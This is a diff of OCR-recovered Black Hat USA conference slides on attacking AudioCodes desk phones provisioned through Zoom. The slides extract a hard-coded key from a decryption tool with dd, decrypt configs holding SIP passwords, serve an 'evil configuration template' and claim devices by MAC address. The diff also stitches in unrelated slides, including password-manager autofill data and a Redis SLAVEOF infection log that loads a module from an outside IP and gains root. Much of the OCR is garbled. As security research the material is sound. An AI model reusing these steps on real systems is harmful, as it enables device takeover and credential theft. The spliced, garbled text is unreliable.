 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 91/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 28.1 Encrypting Configuration Files
 This procedure describes how to encrypt the Configuration file. For example, you may wish
 to encrypt the configuration file when it is send over an unsecure network.
@@ -1388,32 +1181,26 @@ AudioCodes Administrator Manual
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
-Nibfibegi.so
 sVar2 = strlen(acStack_1e8}:
 iVarl = strcmp(acStack_1leé
 if (iVarl == @) {
 __ format = |/home/ipphone/bin/decryption_tool
 (sVar2 - 4),".cfx");
 -f /tmp/back_file.cfx -o %s >
-fdev/null"
 ```
 
 ## Slide 62
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA 2&0e253
-. BS
-[mabrell
 $ strings -n 32 decryption_tool
 openssl_crypt EVP_BytesToKey ERROR cipher[%d], strlen((char*)pw) [%d]
 openssl_crypt EVP_CipherInit ERROR
@@ -1437,15 +1224,11 @@ Invalid command line parameters.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 80/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-black hat
-USA 2&0e253
-. BS
-[mabrell
 $ strings -n 32 decryption_tool
-openssl_crypt EVP_BytesToKey ERROR cipher[%d], strlen((char*)pw) [Xd]
 openssl_crypt EVP_CipherInit ERROR
 openssl_crypt EVP_CipherUpdate ERROR
 openssl_crypt EVP_CipherFinal ERROR
@@ -1467,101 +1250,82 @@ Invalid command line parameters.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 79/100 on the text kept, 60/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-USA 2&0e253
-00011626
-60011624
-00011628
-00011 62c
-00011636
-60011634
-60011638
-08011 63c
-00011646
-00011644
-00011648
-00011 64c
-TG
-61
-08
-Gl
-18
-60
-eB
-08
-41
-08
-61
-3d
-47
-de
-do
-20
-70
-60
-11
-80
-20
-60
-10
-Td
-2d
-4d
-4d
-BT
-Tf
-eg
-e?
-e2
-el
-e2
-el
-ée5
-e2
-e3
-el
-ed
-eb
-FUN 60011620
-XREF[1] :
-GGeGLOTde
-stmdb |,{rd4, 5, r6, r7,
-sub .5p,#0x610
-sub ,3p,#0x8
-cpy :
-add ,5p, 80x18
-cpy :
-ldr , [DAT_06011828]
-sub Py, #0x8
-mov »#0x41
-cpy :
-add =>s hddAratH
-b1 sEXTERNAL>: : memcpy
+Countermeasures
+
+PASSWORD MANAGERS
+
+1.1 NativeView
+ChildrenCount: 2
+AutoFillId: 1073741829
+WebDomain: null
+
+1.2 WebView
+ChildrenCount: 2
+AutoFillId: 1073741826
+WebDomain: m.facebook.com
+
+1.1.1 Username
+AutoFillId: 1073741824
+Dimension: 300x100
+
+1.1.2 Password
+AutoFillId: 1073741825
+Dimension: 300x100
+
+1.2.1 Username
+AutoFillId: 1073741826:196608
+Dimension: 300x100
+
+1.2.2 Password
+AutoFillId: 1073741826:196609
+Dimension: 300x100
 ```
 
 ## Slide 65
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 68/100 on the text kept, 64/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-bisek hat
-USA 2&0e253
-FUN 60011620 KREF[1] : GOGLETde
-06011620 Ta 47 2d ed stmdb Lir4.r3,ré.r7,r8,r9, lr}
-GO011624 61 de 4d e2 sub ,sp,.#0x610
-00011628 08 dO 4d e2 sub .Sp.#0x8
-O601162c O61 50 a0 el cpy :
-00011630 18 70 8d e2 add sp, #0x18
-06011638 e8 11 Sf e5 ldr , [DAT_06011828]
-OG801163c G8 86 47 e2 sub 27, 80x8
-00011646 41 20 a0 e3 mav ,#0x41
-06011648 61 10 &f eB add =>s_h4dAratH
-QGG1164c 3d fd TT eb b1 sEXTERNAL>: : memcpy
+Countermeasures
+
+AssistStructure data for request-triggering view only
+
+No excess information!
+
+PASSWORD MANAGERS
+
+1.1 NativeView
+ChildrenCount: 2
+AutoFillId: 1073741829
+WebDomain: null
+
+1.2 WebView
+ChildrenCount: 2
+AutoFillId: 1073741826
+WebDomain: m.facebook.com
+
+1.1.1 Username
+AutoFillId: 1073741824
+Dimension: 300x100
+
+1.1.2 Password
+AutoFillId: 1073741825
+Dimension: 300x100
+
+1.2.1 Username
+AutoFillId: 1073741826:196608
+Dimension: 300x100
+
+1.2.2 Password
+AutoFillId: 1073741826:196609
+Dimension: 300x100
 ```
 
 ## Slide 66
@@ -1576,107 +1340,41 @@ QGG1164c 3d fd TT eb b1 sEXTERNAL>: : memcpy
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 73/100 on the text kept, 58/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
-900111a0 TO
-GGG111la4 1
-GGG111a8 3
-@@@11ilac fc
-060111be 6O
-@60111b4 62
 Af
 68
-Te
-de
 ae
 be
 2d
-ae
-a
 Ad
 ae
-ae
-FUN_@@@111a8
 ag stmdb sp!,{r4,r5,16,1
 el cpy T6,param_2
-el cpy ry, param_4
 e2 sub sp, sp, #Oxtc
-el cpy rs, param_1
 el cpy ril,param_3
 XREF [1]:
-1.17}
 ```
 
 ## Slide 69
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-bisek hat
-USA 20es3
-900111a0 TO
-GGG111la4 1
-GGG111a8 3
-@@@11ilac fc
-060111be 6O
-@60111b4 62
-Af
-68
-Te
-de
-ae
-be
-2d
-ae
-a
-Ad
-ae
-ae
-FUN _@@@111a8
-eg stmdb
-el cpy
-el cpy
-a2 sub
-el cpy
-el cpy
-orf {r4 rS rol rvira -O
-T6,param_2
-ry, param_4
-sp, sp, #Oxfc
-rs, param_1
-ril,param_3
-XREF [1]:
-1.17}
-```
-
 ## Slide 70
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 61/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
-80011218 87 30
-BOB1121c 88 98
-80011220 64 08
-@G011224 14 10
 80011228 43 Te
-ae
-8d
-ae
-od
 TT
 el
 e5
 el
-a5
 eb
 cpy param_4,1r/
 str ro, [sp,#local_118]
@@ -1691,7 +1389,8 @@ bl <EXTERNAL>: :EVP_BytesToKey
 
 Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 EVP_BytesToKey
@@ -1713,7 +1412,8 @@ Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
 
 Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 96/100 on the text kept, 96/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 EVP_BytesToKey
@@ -1737,11 +1437,10 @@ Source: https://www.openssl.org/docs/man3.1/man3/EVP_BytesToKey.html
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 $ offset=$(python3 -c ‘'print(int("@0@@le8f", base=16))')
 $ dd skip=$offset count=64 if=decryption_tool of=secret.bin bs=1
 ```
@@ -1750,11 +1449,10 @@ $ dd skip=$offset count=64 if=decryption_tool of=secret.bin bs=1
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 73/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 #00111b8 a4 fe ff eb bl <EXTERNAL>: :EVP_des_ede3_cbe
 ```
 
@@ -1762,24 +1460,19 @@ USA 20es3
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 $ secret=$(cat secret.bin)
 $ openssl enc -des-ede3-cbc -P -pass pass:$secret -nosalt
 *** WARNING : deprecated key derivation used.
 Using -iter or -pbkdf2 would be better.
-ke y=4ODAG6 1 FARE AA PPA AAA AIEEE HAA AHA
-iv =C61l4##4ee4 444 ee4
 $ openssl enc -d -des-ede3-cbc -pass pass:$secret -nosalt \
 -in encrypted_config.cfx -out plain_config.cfg
 $ cat plain_config.cfg
 voip/line/@/enabled=1
 voip/line/@/id=123
-voip/line/@/auth_name=XYZ
 voip/line/@/auth_password=XYZ
 ```
 
@@ -1789,11 +1482,10 @@ voip/line/@/auth_password=XYZ
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 91/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 28.1 Encrypting Configuration Files
 This procedure describes how to encrypt the Configuration file. For example, you may wish
 to encrypt the configuration file when it is send over an unsecure network.
@@ -1825,18 +1517,16 @@ AudioCodes Administrator Manual
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -1847,18 +1537,16 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -1869,19 +1557,16 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 80/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Request
 Raw Hex
 GET /api/v2/pbx/provisioning/audiocodes/@09038F9D8992.cfg HTTP/2
-Host: eu@ipbxacp.zoom.us
 User-Agent: AUDC/3.4.6.664 AUDC-IPPhone-C45@HD_UC_3.4.6.684/1
 Accept: */*
 5 Referer: https://provacp.zoom.us/
-lu PAF
 fos
 ```
 
@@ -1889,12 +1574,12 @@ fos
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Response
 Pretty Raw Hex Render
-& Whe
 10
 11
 12
@@ -1916,9 +1601,7 @@ Strict-Transport-Security: max-age=315360008; includeSubDomains
 </head>
 <body>
 <center>
-<hil>
 40@ Bad Request
-</hi>
 </center>
 <center>
 No required SSL certificate was sent
@@ -1936,76 +1619,29 @@ nginx
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Read by a vision model from the page image (replacing unreliable OCR) — confidence 81/100 on the text kept, 75/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
 
 ```text
-File Edit View Go Capture Analyze Statistics Telephony Wireless
-AQAOnmT Roe Ces Be 8
-Tools Help
-S| 2aaaet
-[Ml |tcp.stream eq 2
-VID Source
-1-19 19:38:°06.541412668 192.168.219, 72 41362
-1-19 19:38:06.559799768 197.168.219.772 41362
-1-19 19:38:06.591670758 3.120.121.92 443
-1-19 19:38:06.597166812 3.120.121.92 443
-1-19 19:38:06.597542325 192.168.219.772 41362
-1-19 19:38:06.601687045 3.120.121.92 443
-1-19 19:38:06.602035254 192.168.219,72 41362
-1-19 19:38:06.606450996 3.120.121.9 443
-1-19 19:38:06. 606762007 9 63 9 4136
-1-19 19:38:06.60/7731560 3.120.121.92 443
-1-19 19:38:06. 607970085 92. 1bo.219. a
-1-19 19:38:06.669141160 192.168.219, 72 41362
-1-19 19:38:06. 704012179 3.120.121.92 443
-1-19 19:38:06. 704885248 3.120.121.92 443
-1-19 19:38:06. 705050588 192.168.219,72 41362
-1-19 19:38:06. 706763561 197.168.219.772 41362
-4
-Content Type: Handshake (22)
-Version: TLS 1.2 (@x@303)
-Length: 333
-~ Handshake Protocol: Serwer Key Exchange
-Handshake Type: Server Key Exchange (12)
-Length: 329
-» EC Diffie-Hellman Server Params
-~ Transport Layer Security
-~ TLSvi.2 Record Layer: Handshake Protocol: Multiple Handsha
-Content Type: Handshake (22)
-Version: TLS 1.2 (@x@303)
-Length: 81
-~ Handshake ProtocoL:| Certificate Request
-Handshake Type: Certificate Request (13)
-Length: 73
-Certificate types count: 3
-» Certificate types (3 types)
-Signature Hash Algorithms Length: 30
-» Signature Hash Algorithms (15 algorithms)
-Distinguished Names Length: 35
-» Distinguished Names (35 bytes)
-~ Handshake Protocol: Server Hello Done
-Handshake Tyne: Server Hello Done (14)
-Src.Port Destination
-Dst.Port Protocol Length Info
-3.120.121.92 443 TCP 66 41362 — 443 [ACK]
-3.120.121.92 443 TLSvi.2 583 Client Hello
-192.168. 219.72 41362 TCP 66 443 . 41362 [ACK]
-192.168.219.72 41362 TLSvi.2 1506 Server Hello
-3.120.1271.92 443 TCP 66 41362 ~ 443 [ACK] Seq=518 Ack=1441 Win=32128 Len=0 TSval=4294944
-192.168.219.72 41362 TCP 1506 443 ~ 41362 [PSH, ACK] Seq=1441 Ack=518 Win=62208 Len=1440 TSvall
-3.120,121.92 443 TCP 66 41362 — 443 [ACK] Seg=518 Ack=2881 Win=35008 Len=0 TSval=4294944
-192.168 .219.72 41362 TLSvi.2 1506 Certificate
-Q : Zé P 66 4136 44 ACK en=0 al=4294944
-192.168.219.772 41362 TL5v1i.2 434 Server Key Exchange, - |} = er Hello Done
-3.120,121.92 443 TLSvi.2 1220 Certificate, #6nt Key Exchange, Certificate Verify, Change Cip
-192.168.219.772 41362 TCP 66 443 .. 413627ACK] Seq=4689 Ack=1672 Win=61056 Len=@ TSval=305154
-192.168. 219.72 41362 TLSvi.2 117 ChanggeCipher Spec, Encrypted Handshake Message
-3.120,121.92 443 TCP 66 44662 — 443 [ACK] Seg=1672 Ack=4740 Win=40768 Len=0 TSwal=429494
-3.120.171.92 443 TLSv1.2 266 Application Data
-lessages
-Seq=i Ack=1 Win=29248 Len=0 TSval=4294942974
-Seq=1 Ack=518 Win=62208 Len=8 TSval=30515404764
-#BHUSA @BlackHatEvents
+Slaveof\Replicaof Infection Method
+
+TIME
+1673347867
+SLAVEOF 116.202.102.79 8080
++OK
+TIME
+1673347888
+MODULE LOAD ./temp-1673347866.1.rdb
+...
+MODULE LOAD ./temp-1673347888.1.rdb
+...
+-ERR Error loading the extension. Please check the server logs.
++OK
+...
+rdss 2381675947053628537 id
+uid=0(root) gid=0(root) groups=0(root)
+
+Information Classification: General
 ```
 
 ## Slide 84
@@ -2018,19 +1654,17 @@ Source: https://www.audiocodes.com/media/zhre0lg0/c448hd-c450hd-ip-phone-for-mic
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Response
-an
-ee ee
 16
 Pretty Raw Hex Render
 HTTP/2 208 OK
 Date: Sat, @1 Jul 2@23 09:37:33 GMT
 Content-Type: application/octet-stream
 Content-Length: 6992
-X-Zm-Trackingid: PBX_@@b858508acTa584az6703eb5a700b9T
 X-Zm-Region: VA
 Vary: Origin
 Vary: Access-Control-Request-Method
@@ -2041,36 +1675,24 @@ Accept-Ranges: bytes
 Strict-Transport-Security: max-age=31536088@; includeSubDomains
 X-Content-Type-Options: nosniff
 system/type=C45@HD
-vVoip/dns_cache/mode=DNS_QUERY_FIRST
-Voip/dns_cache_srv/@/name=_sips._tcp.eu@1lsip@g.fr.zoom.us
 voip/dns_cache_srv/@/port=5091
 voip/dns_cache_srv/@/priority=1
-voip/dns_cache_srv/@/target=eu@lsip@g.fr.zoom.us
-voip/dns_cache_srv/@/weight=18
-voip/dns_cache_srv/1/name=_sips._tcp.eu@lsip@g.fr.zoom.us
 voip/dns_cache_srv/1/port=5091
-Voip/dns_cache_srv/1/priority=2
-voip/dns_cache_srv/1/target=eu@lsip®g.am.zoom.us
-Voip/dns_cache_srv/1/weight=18
 ```
 
 ## Slide 86
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 Request
 Raw Hex
 1 GET /api/v2/pbx/provisioning/ audiocodes
 2 Host: eu@lpbxacp.zoom.us
-hake
 4 Referer: https://provacp.zoom.us/
-00908F9D8993 .cfg
-HTTP /2
 User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 ```
 
@@ -2078,11 +1700,10 @@ User-Agent: AUDC/3.4.6.604 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 Client_00908F9D8992
 Identity: Client_OOS08F9D8992
 Verified by: CA_ipp1
@@ -2091,10 +1712,8 @@ Subject Name
 © (Organization):
 CN (Common Name):
 ACL
-Client_OO908F9D8992
 Issuer Name
 © (Organization): ACL
-CN (CommonName): CA_ipp1
 Issued Certificate
 Version: 3
 Serial Number: @2 @@ 9@ &F 9D 89 92
@@ -2108,7 +1727,8 @@ Not Valid After: 2037-02-12
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Pseudo NGINX
@@ -2119,10 +1739,8 @@ server_name eu@1lpbxacp.zoom.us
 ssl_certificate /path/to/server.crt
 ssl_certificate_key /path/to/server.key
 location /
-# m7TLS
 ssl_client_certificate /path/to/ca.crt
 ssl_verify_client on
-# mils
 if ($ssl_client_verify != SUCCESS
 return 4@3
 # X.509 client serial verification
@@ -2136,18 +1754,16 @@ proxy_pass http://localhost:9080
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -2158,11 +1774,10 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 20es3
 vendor redirect service
 A
 2. initiates that Zoom is
@@ -2180,22 +1795,17 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 74/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 Add Device
 Display Name
 Description
 (Optional)
 [ John Doe
 ( John Doe's Phone
-y
 MAC Address [ oogosrsase92 )
-Device Type [_Audiocodes S)
-[ c450hd S )
 Assigned to
 This device type supports up to 1 assignee.
 Assign
@@ -2210,7 +1820,8 @@ Save Cancel
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Company Info > Account Settings >» Desk Phone > Provision Template >» common user template
@@ -2219,13 +1830,11 @@ Description default template for devices
 (Optional)
 Save Cancel
 Template Visit Support Document for more guidance
--
 | personal_settings/soft_key/O/key_function=DIRECTORY
 personal_settings/soft_key/1/key_function=MISSED_CALLS
 personal_settings/soft_key/2/key_function=DND_ALL
 personal_settings/soft_key/3/key_function=Forward_All
 5 personal_settings/soft_key/4/key_function=NONE
-oe)
 Cancel
 #BHUSA @BlackHatEvents
 ```
@@ -2234,7 +1843,8 @@ Cancel
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 89/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Company Info > Account Settings » Desk Phone > Provision Template > evil configuration template
@@ -2252,29 +1862,21 @@ Template Visit Support Document for more guidance
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 75/100 on the text kept, 60/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Request
 Pretty Raw Hex
-1 GET fapl/v2/pbx/provisioning/ Audi oCodes/c450hd/00908F9D8992.cfq HTTP/2
 2 Host: euOlpbxacp.zoom.us
-3 User-Agent: AUDC/3.4.6,604 AUIDC- TPPhone-C45@HD_LUC 3.4.6.604/1
 4 Accept: */*
-a
-@)o ©) >) | Search...
 Response
 Pretty Raw Hex Render
-ise WuLpy tile 2uy pus
-193 voilp/Lline/27/enabled=0
 184 voip/line/27/1d=0
-195 voip/Line/28/enabled=0
 196 voip/line/28/1d=0
 197 voip/Lline/29/enabled=0a
 198 voip/line/29/1d=0
 199 voip/services/msg waiting ind/voice mail number=*86
-ZOO) pravisloning/Tirmware/ur ttps://ptma.sy.gs/pbx/AudloCedes UCC4ASOHD 3,.4.8.198.1,.1mg
-201) provisioning, period/type=weekLy
 202) provisloning/period/weekLy/time=00: 00
 203) provisiloning/random provisioning time=300
 ```
@@ -2283,7 +1885,8 @@ ZOO) pravisloning/Tirmware/ur ttps://ptma.sy.gs/pbx/AudloCedes UCC4ASOHD 3,.4.8.
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Add Device
@@ -2308,7 +1911,8 @@ Template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Request
@@ -2318,21 +1922,17 @@ Raw Hex
 3 Accept: */*
 4 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 5 Connection: close
-=
 Before MAC assignment
 Response
 Pretty Raw Hex
 HTTP/1.1 404 Not Found
 Content-Length: 62
 Connection: close
-Content-Type: application/json: charset=utT-&
 Date: Thu, @6 Jul 2023 12:16:48 GMT
-Request-Context: appId=cid-v1:229bb6bd-@4d7-408d-b225-c6e44e8T5c51b
 ca
 {
 "description": "device MAC @@9@8FAAAAAA was not found"
 }
-i
 & wo
 ```
 
@@ -2342,7 +1942,8 @@ i
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 84/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 Request
@@ -2352,7 +1953,6 @@ Raw Hex
 3 Accept: */*
 4 User-Agent: AUDC/3.4.6.684 AUDC-IPPhone-C45@HD_UC_3.4.6.604/1
 5 Connection: close
-=
 After MAC assignment
 Response
 Raw Hex Render
@@ -2362,10 +1962,7 @@ Raw Hex Render
 4 Content-Type: text/plain; charset=utf-&8
 5 Date: Thu, 866 Jul 2023 12:17:08 GMT
 6 Location: https://eu®lpbxacp.zoom.us/api/v2/pbx/provisioning/ audiocodes /
-ry
 Request-Context: appId=cid-v1:229bb6bd-04d7 -408d-b225-c6e440f5c51b
-oo
-its]
 ```
 
 ## Slide 98
@@ -2394,18 +1991,16 @@ MAC + Config
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 92/100 on the text kept, 86/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-bisek hat
-USA 2&0e253
 vendor redirect service
 A
 2. initiates that Zoom is
 the provisioning and configuration
 server for the added device
 desk phone
-Q
 co
 IT administrator
 ZOOM ne and assigns
@@ -2416,13 +2011,10 @@ a configuration template
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 77/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 20es3
-@.' aQudiocodes C450HD \a Home S—= Log Off
 Manual firmware upgrade
 Configuration | Management # Diagnostics
 Please select a file to upgrade.
@@ -2440,7 +2032,8 @@ Firmware Upgrade
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 81/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 CC audiocodes
@@ -2454,16 +2047,15 @@ A rade Fail
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 93/100 on the text kept, 87/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-lhome/ipphone/scripts/run_ramfs_for_upgrade.sh
 [...]
 FLASHER=flasher
 [...]
 do_upgrade() {
 v "Performing system upgrade..."
-In -s /home/ipphone/bin/1lcdbar /bin/1cdbar
 flasher u /tmp upgrade.img
 v "external flasher exist"
 chmod +x /tmp/flasher_ext
@@ -2484,61 +2076,17 @@ fi
 
 #BHUSA @BlackHatEvents
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 70/100 on the text kept, 38/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
-2)
-black hat
-USA 2&0e253
 undefined
 indefined lseek_SEEK_SET()
-Te@:1 <RETURN=
 lseek_SEEK_SET
 00012b38 68 20 a@ e3
 @@012b3c fb f9 Tf ea
 mov 12, #0x8
-<EXTERNAL=: : lseek
-XREF [34] :
-FUN_@80@11f30:
-FUN_00011T30:
-FUN_00011T30:
-FUN_00011T30:
-FUN_00011T30:
-FUN_@80@11f30:
-FUN_@80@11f30:
-FUN_@80@11f40:
-FUN_@0011fa4:
-FUN_@@@11fa4:
-FUN_@@@121bc:
-FUN_@@@121bc:
-FUN_@@@15038:
 FUN_@@@152b8:
-FUN_@O@1572c:
-FUN_@8@157c4:
-FUN_@8015e86:
-FUN_@@@15Tac:
-FUN_@@@15Tac:
-FUN_@@0164b0:
-90011a78(c)
-g0011ac4(c)
-00011bb4(c)
-90011d3c(c)
-gO01idd4(c)
-90011e34(c)
-20011e80(c)
-90011f50(c)
-9801211c(c)
-90012190(c)
-00012220(c)
-900124T4(c)
-000151a0(c)
-90015448(c)
-@001579c (c)
-90015814(c)
-98015ec8(c)
-90015FTO(c)
-90016048(c)
-9001657c(c)
 [more]
 ```
 
@@ -2546,11 +2094,11 @@ gO01idd4(c)
 
 #BHUSA @BlackHatEvents
 
